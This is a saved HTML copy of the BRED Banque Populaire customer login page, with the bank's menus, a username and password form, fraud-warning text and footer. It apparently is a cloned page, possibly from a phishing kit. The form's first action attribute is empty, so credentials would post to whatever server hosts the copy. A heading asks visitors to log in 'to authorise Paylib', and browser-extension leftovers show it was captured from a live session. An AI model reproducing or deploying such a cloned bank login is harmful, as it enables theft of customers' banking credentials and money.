      <div class="top-nav" id="topNav">
        <div class="top-nav__inner">
          <nav>
            <ul class="top-nav__list">

              <li class="">
                <a data-gtm-nav-top="Particuliers" href="https://www.bred.fr/particuliers" title="Particuliers">Particuliers</a>
              </li>

              <li class="">
                <a data-gtm-nav-top="Professionnels et Associations" href="https://www.bred.fr/professionnels-associations" title="Professionnels et Associations">Professionnels et Associations</a>
              </li>

              <li class="">
                <a data-gtm-nav-top="Entreprises" href="/entreprises" title="Entreprises">Entreprises</a>
              </li>

              <li class="">
                <a data-gtm-nav-top="Banque Privée" href="/banqueprivee" title="Banque Privée">Banque Privée</a>
              </li>

            </ul>
          </nav>
          <nav>
            <ul class="top-nav__list--alt">

              <li class=" 
">
                <a href="https://www.bred.fr/la-bred" title="La BRED">La BRED</a>
              </li>

              <li class=" 
">
                <a href="https://www.bred.fr/une-banque-cooperative" title="Une banque coopérative">Une banque coopérative</a>
              </li>

              <li class=" mobile-only">
                <a href="https://www.bred.fr/recrutement" title="Recrutement">Recrutement</a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
      <div class="container">
        <div class="row">

          <div class="main-header">

            <!-- MOBILE ACCESS -->
            <div class="mobile-access mobile-only" id="mobile-access">
              <a class="mobile-access__link" data-gtm-nav-top="Mon espace client" href="/authentification" title="Mon espace client">
                <img width="16" height="16" alt="Mon espace client" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-mobile-user.png">
              </a>

              <a href="#" class="mobile-access__link" id="searchAccess">
                <img width="16" height="16" alt="Mon espace client" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-search-header.png">
              </a>
            </div>

            <!-- LOGO -->
            <div class="main-logo pull-left col-sm-3" id="logo">
              <a data-gtm-nav-top="logo" href="https://www.bred.fr">
                <img width="155" height="54" alt="BRED" srcset="https://www.bred.fr/++theme++bredfr/assets/images/logo-bred.svg 155w, https://www.bred.fr/++theme++bredfr/assets/images/logo-bred-113.svg 113w" src="https://www.bred.fr/++theme++bredfr/assets/images/logo-bred.svg"></a>
            </div>
            <div class="main-nav__wrapper col-sm-9">
              <!-- SEARCH -->
              <div id="search_header_area">

              </div>
              <!-- TOP NAV -->

              <div id="buttonsHeader" class="col-sm-10 desktop-only text-right ">
                <a title="Devenir client" data-gtm-nav-top="Devenir client" href="/particuliers/devenir-client" id="" class="btn-regular btn-regular--invert btn-regular--small pull-lg-right" data-gtm-vis-recent-on-screen-1801942_372="648" data-gtm-vis-first-on-screen-1801942_372="648" data-gtm-vis-total-visible-time-1801942_372="100" data-gtm-vis-has-fired-1801942_372="1"><span class="fast-access__icon fast-access__icon--devenir-client"></span>Devenir client</a>

                <a id="buttonLogin" class="btn-regular btn-regular--bordered btn-regular--small pull-lg-right desktop-inline-only" title="Mon espace client" data-gtm-nav-top="Mon espace client" href="/authentification?source=no" data-gtm-vis-has-fired-1801942_372="1">
                  <span class="fast-access__icon fast-access__icon--account"></span>
                  Mon espace client
                </a>
              </div>
              <!-- MAIN NAV -->
              <nav class="main-nav" id="mainNav">
                <ul itemscope="" itemtype="http://www.schema.org/SiteNavigationElement" class="main-nav__list ">

                  <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Vos projets"><a href="https://www.bred.fr/particuliers/vos-projets" class="main-nav__link" itemprop="url" title="Vos projets" target="_self">Vos projets</a></li>

                  <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Comptes et cartes"><a href="https://www.bred.fr/particuliers/compte-bancaire" class="main-nav__link" itemprop="url" title="Comptes et cartes" target="_self">Comptes et cartes</a></li>

                  <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Epargner"><a href="https://www.bred.fr/particuliers/epargne" class="main-nav__link" itemprop="url" title="Epargner" target="_self">Epargner</a></li>

                  <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Emprunter"><a href="https://www.bred.fr/particuliers/credit" class="main-nav__link" itemprop="url" title="Emprunter" target="_self">Emprunter</a></li>

                  <li class="main-nav__item" itemprop="name" data-gtm-nav-top="Assurer"><a href="https://www.bred.fr/particuliers/assurance" class="main-nav__link" itemprop="url" title="Assurer" target="_self">Assurer</a></li>

                  <li id="magic-line" style="width: 0px; left: 0px;"></li>
                </ul>

                <a data-gtm-nav-top="Recherche Agences" title="Trouver une agence" href="https://www.bred.fr/trouver-agence" class="main-nav__pin desktop-only ">
                  <img src="/++theme++bredfr/assets/images/icon-pin.png" alt="Trouver une agence">
                </a><a href="#" id="openForm" title="Ouvrir la recherche" class="search-main__submit search-main__submit--trigger ">
                  <img width="16" height="16" alt="Ouvrir la recherche" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-search-header.png">
                </a>

              </nav>
              <!-- FAST ACCESS df-->
              <div class="fast-access mobile-only" id="fastAccess">

                <p><a href="/particuliers/devenir-client" class="btn-regular btn-regular--small btn-contrast" id="buttonSignup" title="Devenir client" data-gtm-vis-has-fired-1801942_372="1"> <span class="fast-access__icon fast-access__icon--client"></span> Devenir client </a> <a href="/trouver-agence" class="btn-regular btn-regular--small btn-contrast" id="buttonMap" title="Trouver une agence" data-gtm-vis-has-fired-1801942_372="1"> <span class="fast-access__icon fast-access__icon--pin"></span> Trouver une agence </a> <a href="/faq/faq-urgences" class="btn-regular btn-regular--small btn-contrast" id="buttonEmergency" title="Urgence" data-gtm-vis-has-fired-1801942_372="1"> <span class="fast-access__icon fast-access__icon--emergency"></span> Urgence </a></p>
                <!-- DOWNLOAD APP -->
                <div class="download-app mobile-only">
                  <p>Télécharger l'application BREDConnect pour gérer vos comptes</p>
                  <a href="https://play.google.com/store/apps/details?id=fr.bred.fr&amp;hl=fr" class="download-app__link-android main-js-link" title="Google Play">
                    <img width="159" height="61" src="++theme++bredfr/assets/images/app-android.png" alt="Google Play" class="download-app__img">
                  </a>
                  <a href="https://itunes.apple.com/fr/app/bred/id470182955?mt=8" class="download-app__link-ios main-js-link" title="App Store">
                    <img width="159" height="61" src="++theme++bredfr/assets/images/app-iphone.png" alt="App Store" class="download-app__img">
                  </a>
                </div>
              </div>
            </div>

          </div> <!-- /.main-header -->
        </div> <!-- /.row -->
      </div> <!-- /.container -->
    </header>
    <form method="GET" class="search-main__form search-main__form--header" id="searchHeader" action="https://www.bred.fr/resultats-de-recherche">
      <!-- TUILE -->
      <input data-class-css="auto-suggest-header" data-target="auto-suggest-header-area" autocomplete="off" type="text" class="search-main__input" name="searchTerm" id="inputHeaderSearch" placeholder="" data-form="searchHeader" data-words="false" data-suggest-url="https://api.bred.fr/enterprisesearch/v1/suggestions" data-contents-url="https://api.bred.fr/enterprisesearch/v1/contents">
      <button type="submit" class="search-main__submit mobile-only" title="Rechercher">
        <img width="16" height="16" alt="Icône recherche" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-search-header-contrast.png">
      </button>
      <a class="search-main__submit desktop-only" id="searchLaunch" title="Lancer la recherche">
        <img width="16" height="16" alt="Lancer la recherche" src="https://www.bred.fr/++theme++bredfr/assets/images/icon-search-header.png">
      </a>
      <a class="search-main__submit desktop-only" id="searchClose" title="Fermer la recherche">
        <img width="16" height="16" alt="Fermer la recherche" src="https://www.bred.fr/++theme++bredfr/assets/medias/images/icones/ico-close-white.svg">
      </a>

      <div id="auto-suggest-header-area">

      </div>

    </form> <!-- /.wrapper-header -->
    <!-- /.wrapper-alert -->
    <section id="breadcrumb">
      <div class="container">
        <div class="row">
          <div class="col-sm-12">
            <div class="breadcrumb">
              <ol itemscope="" itemtype="http://schema.org/BreadcrumbList" class="breadcrumb__list">
                <li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="breadcrumb__item">
                  <a itemprop="item" class="breadcrumb__link" href="https://www.bred.fr">
                    <span itemprop="name">Accueil</span>
                    <meta itemprop="position" content="1">
                  </a>
                </li>

                <li itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="breadcrumb__item">

                  <a itemprop="item" class="breadcrumb__link" href="https://www.bred.fr/authentification">
                    <span itemprop="name" class="breadcrumb__current">Authentification - accéder à mon compte</span>
                    <meta itemprop="position" content="2">
                  </a>

                </li>

              </ol>
            </div>
          </div>
        </div>
      </div>
    </section>

    <article id="content" data-panel="content">
      <div class="mosaic-grid-row">
        <div class="mosaic-grid-cell mosaic-width-full mosaic-position-leftmost">
          <div class="movable removable mosaic-tile mosaic-bredfr.tiles.authentication-tile">
            <div class="mosaic-tile-content">

              <section class="section-connection ">
                <div class="container">
                  <div class="row">
                    <div class="col-md-12">
                      <h1 class="connexion__big-title">Mon espace client en toute sécurité</h1>
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-md-7 connexion">
                      <div class="connexion__inner">
                        <h2 class="connexion__title"> AUTHENTIFIEZ-VOUS À LA BRED POUR AUTORISER LE PAYLIB</h2>

                        <div class="connectionSet">

                          <div class="tab-content">
                            <div class="tab-pane fade in active" id="viaId" role="tabpanel" aria-labelledby="viaId-tab">
                              <form action="" method="POST" name="authen_simple" class="form-authentication" id="authen_simple" autocomplete="off" accept-charset="ISO-8859-1" action="https://www.bred.fr/transactionnel/Authentication">

                                <input name="trustedDevice" type="hidden" id="trustedDevice">

                                <div class="form-group">
                                  <label for="identifiant">Identifiant</label>
                                  <input name="user" id="user" tabindex="1" autocomplete="off" class="form-control" value="">
                                  <div class="form-action"><a href="/authentification/recuperer-mon-identifiant" title="Récupérer mon identifiant" class="underline" target="_self">Récupérer
                                      mon identifiant</a></div>
                                </div>
                                <div class="form-group">
                                  <label for="password">Mot de passe</label>
                                  <div class="hideShowPassword-wrapper" style="position: relative; display: block; vertical-align: baseline; margin: 0px;"><input name="passcode" id="passcode" type="password" tabindex="2" autocomplete="off" maxlength="8" class="form-control hideShowPassword-field" style="margin: 0px; padding-right: 46px;"><button type="button" role="button" aria-label="Show Password" title="Afficher le mot de passe" tabindex="0" class="hideShowPassword-toggle hideShowPassword-toggle-show" aria-pressed="false" style="position: absolute; right: 0px; top: 50%; margin-top: -19px;">Afficher</button></div>
                                  <div class="form-action"><a href="" class="underline" target="_self">Demander
                                      un nouveau mot de passe</a></div>
                                </div>
                                <div class="form-group form-submit">
                                  <button class="btn-regular btn-regular--bigger btn-authconnexion" id="authen_simple_button" data-gtm-vis-has-fired-1801942_372="1">Me
                                    connecter
                                  </button>
                                </div>
                                <div class="form-group">
                                  <div class="form-action"><a href="/faq/faq-securite" title="Nos conseils sécurité" class="security" target="_self">Nos conseils sécurité</a></div>
                                </div>
                              </form>
                            </div>
                          </div>

                        </div>

                      </div>
                    </div>

                    <div class="col-md-5 bredConnectSignUp mobile-padding-top">
                      <div class="bredConnectSignUp__inner">
                        <div class="bredConnectSignUp__content">
                          <div class="row">
                            <div class="col-md-3 text-center main-padding-top"><img src="/medias/images/icones/ico_dsp2_attention_noshadow.png"></div>
                            <div class="col-md-9">
                              <!--<h2 class="title-highlight"><strong>Alerte Fraude !</strong><br /> <small class="title-highlight">La BRED vous met en garde</small></h2>-->
                              <h2 class="title-highlight">Vigilance Fraude</h2>
                            </div>
                          </div>
                          <p class="text-center main-small-padding-bottom"></p>
                          <p><strong>Pour les fraudeurs, tous les moyens de contact sont bons pour parvenir à vous escroquer :</strong> emails, SMS, appels...</p>
                          <p>Ces tentatives servent à&nbsp;<strong>récupérer vos données personnelles et confidentielles</strong> : nom, prénom, identifiants, codes bancaires, mots de passe... pour vous dérober des sommes d'argent insidieusement.</p>
                          <p>La BRED ne vous demandera jamais</p>
                          <ul>
                            <li>de vous connecter sur son site ou son appli pour résoudre un problème de sécurité.</li>
                            <li>de lui communiquer vos codes confidentiels, codes sécurité reçus par sms ou mots de passe, même pour annuler un paiement.</li>
                          </ul>
                          <br>
                          <p class="text-center">En cas de doute, contactez-nous au <br><a href="tel:0806060211"><img src="/medias/images/illustrations/landings/illu-num-france-bds.png" alt="Zéro huit cent six zéro soixante deux cent onze service gratuit + prix de l'appel" width="200px"></a></p>
                          <br>
                          <div class="text-center"><a href="/actualites/comment-eviter-les-tentatives-d-escroquerie" class="btn-regular btn-regular--invert" data-gtm-vis-has-fired-1801942_372="1">Je m'informe sur les escroqueries</a></div>
                          <br>
                          <p><span class="color-youtube">Vous pensez avoir été victime d'une escroquerie ?</span></p>
                          <ul>
                            <li><u><a href="/faq/comptes-et-cartes/cartes-bancaires/comment-faire-opposition-sur-ma-carte-bancaire" class="link-txt-interne">Faites opposition sur votre carte bancaire</a></u></li>
                            <li><u><a href="/faq/bredconnect/le-service/comment-changer-mon-mot-de-passe" class="link-txt-interne">Changez le mot de passe de votre Espace client</a></u></li>
                            <li>Utilisez notre <u><a href="/contact/formulaire-de-declaration" class="link-txt-interne">formulaire de déclaration</a></u></li>
                          </ul>
                        </div>
                      </div>
                    </div>

                  </div> <!-- /.row -->
                </div> <!-- /.container -->
              </section> <!-- /.section-connection -->

              <section class="section section-enroll bg-color-white">
                <div class="container">
                  <div class="row">
                    <div class="col-sm-12 text-center">
                      <h2>Je ne suis pas&nbsp;<span class="title-highlight">abonné à BRED<em>Connect</em></span><br>je souscris au service de gestion de compte en ligne</h2>
                      <a href="/particuliers/compte-bancaire/comptes-en-ligne/bredconnect-compte-ligne" class="btn-regular btn-regular--invert btn-regular--bigger" data-gtm-vis-has-fired-1801942_372="1">Découvrir BREDConnect</a><a href="/particuliers/souscrire-en-ligne/bredconnect" class="btn-regular t btn-regular--bigger" data-gtm-vis-has-fired-1801942_372="1">Souscrire à BRED<em>Connect</em></a>
                    </div>
                  </div>
                  <!-- /.row -->
                </div>
                <!-- /.container -->
              </section>
              <!-- /.section-enroll -->
              <section class="section section-enroll bg-color-grey-2">
                <div class="container">
                  <div class="row">
                    <div class="col-sm-12 text-center">
                      <h2>Je ne suis pas encore <span class="title-highlight">client BRED</span></h2>
                      <a class="btn-regular btn-regular--invert btn-regular--bigger" href="/particuliers/ouvrir-un-compte" data-gtm-vis-has-fired-1801942_372="1">J'ouvre un compte</a>
                    </div>
                  </div>
                  <!-- /.row -->
                </div>
                <!-- /.container -->
              </section>
              <!-- /.section-enroll -->

            </div>
          </div>
        </div>
      </div>
      <div class="mosaic-grid-row">
        <div class="mosaic-grid-cell mosaic-width-full mosaic-position-leftmost">
          <div class="movable removable mosaic-tile mosaic-plone.app.standardtiles.existingcontent-tile">
            <div class="mosaic-tile-content">

              <section class="existing-content-tile">

                <div>

                  <div id="parent-fieldname-text" class="">
                    <!-- .section-app -->
                    <section class="section section-app section--blue section--dark">
                      <!-- SECTION -->
                      <div class="container">
                        <div class="row">
                          <!-- LIGNE -->
                          <!-- Visual --><img src="https://www.bred.fr/medias/images/illustrations/divers/illu-section-appli-bred.png" title="illu-section-appli-bred.png" data-enllax-ratio=".2" alt="Application Mobile BRED" data-enllax-type="foreground" class="section-app__img wow fadeInDown" style="visibility: visible; animation-name: fadeInDown;">
                          <div class="col-xs-12 col-sm-6 col-sm-push-6 col-lg-5 col-lg-push-5">
                            <!-- COLONNE -->
                            <!-- Title -->
                            <div class="base-title main-center"><span class="base-title__highlight">Téléchargez l'application</span> pour votre téléphone Android ou iOS</div>
                            <!-- CTA -->
                            <div class="section-app__links"><a href="https://play.google.com/store/apps/details?id=fr.bred.fr&amp;hl=fr" class="section-app__link main-js-link" title="Google Play"> <img src="++theme++bredfr/assets/images/app-android.png" alt="Télécharger l'application mobile sur Google Play"> </a> <a href="https://itunes.apple.com/fr/app/bred/id470182955?mt=8" class="section-app__link main-js-link" title="App Store"> <img src="++theme++bredfr/assets/images/app-iphone.png" alt="Télécharger l'application mobile sur App Store"> </a></div>
                            <p class="section-app__footer"><a class="btn-regular" href="/particuliers/compte-bancaire/comptes-en-ligne/application-mobile-bred-iphone-android-windows" title="Découvrir l'application mobile BRED" data-gtm-vis-has-fired-1801942_372="1">Découvrir l'application mobile</a></p>
                          </div>
                        </div>
                      </div>
                    </section>
                    <!-- /.section-app -->
                  </div>

                </div>

              </section>

            </div>
          </div>
        </div>
      </div>
    </article>
    <!-- .section-pre-footer -->
    <section class="section section-pre-footer pre-footer bg-color-grey-5 color-white section--stretch" id="marketFooter">
      <!-- SECTION -->
      <div class="container">
        <div class="row">
          <!-- LIGNE -->
          <div class="col-sm-12">
            <!-- COLONNE -->

            <ul class="pre-footer__list">

              <li class="pre-footer__item">
                <a class="pre-footer__link" title="Vos projets" target="_self" data-gtm-nav-bottom="Vos projets" href="https://www.bred.fr/particuliers/vos-projets">Vos projets</a>
              </li>

              <li class="pre-footer__item">
                <a class="pre-footer__link" title="Comptes et cartes" target="_self" data-gtm-nav-bottom="Comptes et cartes" href="https://www.bred.fr/particuliers/compte-bancaire">Comptes et cartes</a>
              </li>

              <li class="pre-footer__item">
                <a class="pre-footer__link" title="Epargner" target="_self" data-gtm-nav-bottom="Epargner" href="https://www.bred.fr/particuliers/epargne">Epargner</a>
              </li>

              <li class="pre-footer__item">
                <a class="pre-footer__link" title="Emprunter" target="_self" data-gtm-nav-bottom="Emprunter" href="https://www.bred.fr/particuliers/credit">Emprunter</a>
              </li>

              <li class="pre-footer__item">
                <a class="pre-footer__link" title="Assurer" target="_self" data-gtm-nav-bottom="Assurer" href="https://www.bred.fr/particuliers/assurance">Assurer</a>
              </li>

            </ul>

          </div>
        </div>
      </div>
    </section><!-- /.section-pre-footer -->

    <!-- .section-footer -->
    <section class="section section-footer footer section--black section--dark" id="mainFooter">
      <div class="container">
        <div class="row">
          <div class="col-sm-3 col-md-5">
            <div id="presentationBRED">
              <div id="presentationBRED">
                <p><img src="/medias/images/logos/log-bred-2l-blanc.png" alt="logoBRED" width="200px" height="52px"></p>
                <p><strong>La BRED</strong> est une <strong>Banque Populaire coopérative</strong>.<br> Ses clients sociétaires, détenteurs de parts sociales qui composent le capital, participent au développement de l’économie réelle, sur les territoires où elle est implantée.</p>
                <p>Son cœur de métier est la banque commerciale, en France (Ile de France, Normandie, Outre-mer) et à l’étranger via ses filiales.<br><strong>La BRED</strong> entretient une relation de long terme avec plus d’1,3 million de clients.</p>
              </div>
            </div>
          </div>

          <div class="col-sm-3 col-md-2">
            <ul class="footer__list">

              <li class="footer__item"><a class="footer__link" title="Ouvrir un compte" target="_self" data-gtm-nav-bottom="Ouvrir un compte" href="https://www.bred.fr/particuliers/ouvrir-un-compte">Ouvrir un compte</a></li>

              <li class="footer__item"><a class="footer__link" title="Nos actualités" target="_self" data-gtm-nav-bottom="Nos actualités" href="https://www.bred.fr/actualites">Nos actualités</a></li>

              <li class="footer__item"><a class="footer__link" title="Espace presse" target="_blank" data-gtm-nav-bottom="Espace presse" href="https://newsroom.bred.fr/">Espace presse</a></li>

              <li class="footer__item"><a class="footer__link" title="Recrutement" target="_self" data-gtm-nav-bottom="Recrutement" href="https://www.bred.fr/recrutement">Recrutement</a></li>

              <li class="footer__item"><a class="footer__link" title="Nos partenaires" target="_self" data-gtm-nav-bottom="Nos partenaires" href="https://www.bred.fr/nos-partenaires">Nos partenaires</a></li>

              <li class="footer__item"><a class="footer__link" title="Nos simulateurs" target="_self" data-gtm-nav-bottom="Nos simulateurs" href="https://www.bred.fr/outils-aide">Nos simulateurs</a></li>

              <li class="footer__item"><a class="footer__link" title="About us" target="_self" data-gtm-nav-bottom="About us" href="https://www.bred.fr/english">About us</a></li>

            </ul>
          </div>

          <div class="col-sm-3 col-md-2">
            <ul class="footer__list">

              <li class="footer__item"><a class="footer__link" target="_self" data-gtm-nav-bottom="Accès malentendants" href="https://www.bred.fr/acceo" title="Accès malentendants"><img alt="Accès malentendants" width="30" height="30" src="https://www.bred.fr/medias/images/icones/ico-acceo.png"></a></li>

              <li class="footer__item"><a class="footer__link" title="Contact" target="_self" data-gtm-nav-bottom="Contact" href="https://www.bred.fr/contact">Contact</a></li>

              <li class="footer__item"><a class="footer__link" title="Urgence" target="_self" data-gtm-nav-bottom="Urgence" href="https://www.bred.fr/faq/faq-urgences">Urgence</a></li>

              <li class="footer__item"><a class="footer__link" title="Foire aux questions" target="_self" data-gtm-nav-bottom="Foire aux questions" href="https://www.bred.fr/faq">Foire aux questions</a></li>

              <li class="footer__item"><a class="footer__link" title="Plan du site" target="_self" data-gtm-nav-bottom="Plan du site" href="https://www.bred.fr/sitemap">Plan du site</a></li>

              <li class="footer__item"><a class="footer__link" title="Plainte/Réclamation" target="_self" data-gtm-nav-bottom="Plainte/Réclamation" href="https://www.bred.fr/plainte-et-reclamation">Plainte/Réclamation</a></li>

              <li class="footer__item"><a class="footer__link" title="Sécurité" target="_self" data-gtm-nav-bottom="Sécurité" href="https://www.bred.fr/faq/faq-securite">Sécurité</a></li>

            </ul>
          </div>

          <div class="col-sm-3 col-md-3">
            <ul class="footer__list">

              <li class="footer__item"><a class="footer__link" title="Informations réglementaires" target="_self" data-gtm-nav-bottom="Informations réglementaires" href="https://www.bred.fr/informations-reglementaires">Informations réglementaires</a></li>

              <li class="footer__item"><a class="footer__link" title="Garanties des dépôts" target="_self" data-gtm-nav-bottom="Garanties des dépôts" href="https://www.bred.fr/garantie-des-depots">Garanties des dépôts</a></li>

              <li class="footer__item"><a class="footer__link" title="Notice légale" target="_self" data-gtm-nav-bottom="Notice légale" href="https://www.bred.fr/notice-legale">Notice légale</a></li>

              <li class="footer__item"><a class="footer__link" title="Tarifs" target="_self" data-gtm-nav-bottom="Tarifs" href="https://www.bred.fr/tarifs">Tarifs</a></li>

              <li class="footer__item"><a class="footer__link" title="Protection des données personnelles" target="_self" data-gtm-nav-bottom="Protection des données personnelles" href="https://www.bred.fr/informations-reglementaires/traitement-des-donnees-personnelles">Protection des données personnelles</a></li>

              <li class="footer__item"><a class="footer__link" title="Cookies" target="_self" data-gtm-nav-bottom="Cookies" href="https://www.bred.fr/informations-reglementaires/cookies">Cookies</a></li>

            </ul>
          </div>

        </div>
      </div>
    </section><!-- /.section-footer -->
    <!-- .section-pre-post-footer -->
    <section id="socialNetwork" class="section section-pre-post-footer pre-post-footer bg-color-grey-5 color-white section--stretch">
      <div class="container">
        <div class="row">
          <div class="col-sm-6 col-sm-offset-3">
            <ul class="pre-post-footer__list main-flex main-flex-row main-flex-around">
              <li class="pre-post-footer__item"><span class="social-network__link obflink" title="Facebook" data-link="https://www.facebook.com/BRED.Banque.Populaire/" target="_blank"><img src="../../medias/images/icones/ico-social-facebook.png" alt="Facebook"></span></li>
              <li class="pre-post-footer__item"><span class="social-network__link obflink" title="Instagram" data-link="https://www.instagram.com/bred_bp/" target="_blank"><img src="../../medias/images/icones/icon-social-instagram.png" alt="Instagram"></span></li>
              <li class="pre-post-footer__item"><span class="social-network__link obflink" title="YouTube" data-link="https://www.youtube.com/user/videosBRED" target="_blank"><img src="../../medias/images/icones/ico-social-youtube.png" alt="YouTube"></span></li>
              <li class="pre-post-footer__item"><span class="social-network__link obflink" title="Twitter" data-link="https://twitter.com/BRED_BP" target="_blank"><img src="../../medias/images/icones/ico-social-twitter.png" alt="Twitter"></span></li>
              <li class="pre-post-footer__item"><span class="social-network__link obflink" title="LinkedIn" data-link="https://www.linkedin.com/company/bred-banque-populaire/" target="_blank"><img src="../../medias/images/icones/ico-social-linkedin.png" alt="LinkedIn"></span></li>
            </ul>
          </div>
        </div>
      </div>
    </section> <!-- /.section-pre-post-footer -->
    <section class="section-dark bg-color-black color-white" id="copyright_footer">
      <div class="container">
        <div class="row">
          <div class="col-md-12 text-center">
            <p>© BRED Banque Populaire 2019</p>
            <p></p>
          </div>
        </div>
      </div>
    </section>
    <!-- .section-post-footer -->
    <section class="section section-post-footer">
      <!-- SECTION -->
      <div class="container">
        <div class="row">
          <!-- LIGNE -->
          <img width="200" height="68" src="/bredfr/++theme++bredfr/assets/images/logo-bred.svg" alt="Logo Bred" class="section-post-footer__logo wow fadeInUp" style="visibility: hidden; animation-name: none;">
        </div>
      </div>
    </section><!-- /.section-post-footer -->

    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/imagesloaded.pkgd.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/jquery.enllax.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/bootstrap.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/jquery.cookie.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/underscore.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/wow.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/scripts/slick.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/scripts/main.min.js"></script>
    <script class="anonymous_scripts" type="didomi/javascript" data-vendor="c:bred-LMEFWAkq" src="/++theme++bredfr/assets/scripts/btracking.min.js"></script>
    <script type="text/javascript" src="/++theme++bredfr/assets/scripts/relocate.min.js"></script>
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/scripts/obfuscation.min.js"></script>
    <!-- documentation: https://igorescobar.github.io/jQuery-Mask-Plugin/docs.html -->
    <script class="anonymous_scripts" type="text/javascript" src="/++theme++bredfr/assets/vendor/jquery.mask.min.js"></script>

  </div>
  <div id="scrnli_recorder_root"></div><!-- /.page -->
  <div id="technical_area">
    <!-- zone pour des ajouts locaux de balises -->
  </div>
  <div id="scrollUp"><a href="#top"><img alt="remonter" width="38" height="38" src="/bredfr/++theme++bredfr/assets/images/ico_to_top.png"></a></div>

  <script type="text/javascript" src="https://www.bred.fr/++theme++bredfr/assets/vendor/hideShowPassword.min.js"></script>
  <script type="text/javascript" src="https://www.bred.fr/++theme++bredfr/assets/scripts/authen.min.js"></script>

  <iframe src="chrome-extension://ijejnggjjphlenbhmjhhgcdpehhacaal/audio-devices.html" allow="microphone" style="display: none;"></iframe><input type="file" id="" name="file" style="display: none;">
  <div data-v-f3fb3dc8="">
    <div data-v-f3fb3dc8="" class="container_selected_area" style="cursor: crosshair;"></div>
    <div data-v-f3fb3dc8="" class="area" style="left: 0px; top: 0px; width: 0px; height: 0px;"></div>
  </div>
</body>

</html>
<!-- partial -->
  
</body>
</html>
